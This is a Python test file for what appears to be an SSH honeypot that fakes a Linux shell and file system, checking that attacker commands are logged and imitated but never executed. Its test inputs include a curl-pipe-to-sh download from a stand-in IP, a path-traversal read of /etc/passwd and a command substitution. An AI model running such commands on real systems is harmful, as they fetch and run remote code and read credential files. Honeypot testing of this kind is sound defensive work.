from __future__ import annotations

import socket

from honeybot.reply import respond
from honeybot.vfs import FAKE_UNAME, VFS


def test_path_stays_inside_vfs():
    vfs = VFS("root")
    assert vfs.resolve("/tmp/../../etc/passwd") == "/etc/passwd"
    assert vfs.resolve("/../../../../etc/passwd") == "/etc/passwd"
    assert vfs.resolve("../etc/passwd") == "/etc/passwd"
    reply = respond(vfs, "cat /tmp/../../etc/passwd")
    assert "root:x:0:0" in reply.stdout
    missing = respond(vfs, "cat /no/such")
    assert missing.exit_code == 1


def test_cd_cannot_leave_tree():
    vfs = VFS("ubuntu")
    assert vfs.home == "/home/ubuntu"
    respond(vfs, "cd /tmp")
    assert vfs.cwd == "/tmp"
    respond(vfs, "cd ../../../../..")
    assert vfs.cwd == "/"


def test_uname_is_fake_linux():
    reply = respond(VFS("root"), "uname -a")
    assert reply.stdout.strip() == FAKE_UNAME
    assert "Windows" not in reply.stdout


def test_pipe_is_logged_by_caller_and_not_run(monkeypatch):
    def explode(self, address):
        raise AssertionError(address)

    monkeypatch.setattr(socket.socket, "connect", explode)
    reply = respond(VFS("root"), "curl http://203.0.113.5/a | sh")
    assert "saved" in reply.stdout
    assert "203.0.113.5" not in reply.stdout
    assert reply.exit_code == 0
    assert reply.close is False
    piped = respond(VFS("root"), "uname -a | head")
    assert FAKE_UNAME in piped.stdout
    chained = VFS("root")
    both = respond(chained, "cd /tmp && cat /etc/passwd")
    assert chained.cwd == "/tmp"
    assert "root:x" not in both.stdout
    hidden = respond(VFS("root"), "echo $(id)")
    assert "uid=" not in hidden.stdout


def test_fake_host_looks_like_linux():
    vfs = VFS("root")
    assert "root:!:" in (vfs.read_file("/etc/shadow") or "")
    assert "10.0.0.15" in respond(vfs, "ip a").stdout
    assert "10.0.0.1" in respond(vfs, "ip route").stdout
    assert "10.0.0.15" in respond(vfs, "ifconfig").stdout
    env = respond(vfs, "env").stdout
    assert "USER=root" in env
    assert "HOME=/root" in env
    history = respond(vfs, "history").stdout
    assert "uname -a" in history


def test_simple_curl_does_not_connect(monkeypatch):
    def explode(self, address):
        raise AssertionError(address)

    monkeypatch.setattr(socket.socket, "connect", explode)
    vfs = VFS("root")
    reply = respond(vfs, "curl http://203.0.113.5/a.sh")
    assert "saved" in reply.stdout
    assert vfs.read_file("/tmp/a.sh") == ""
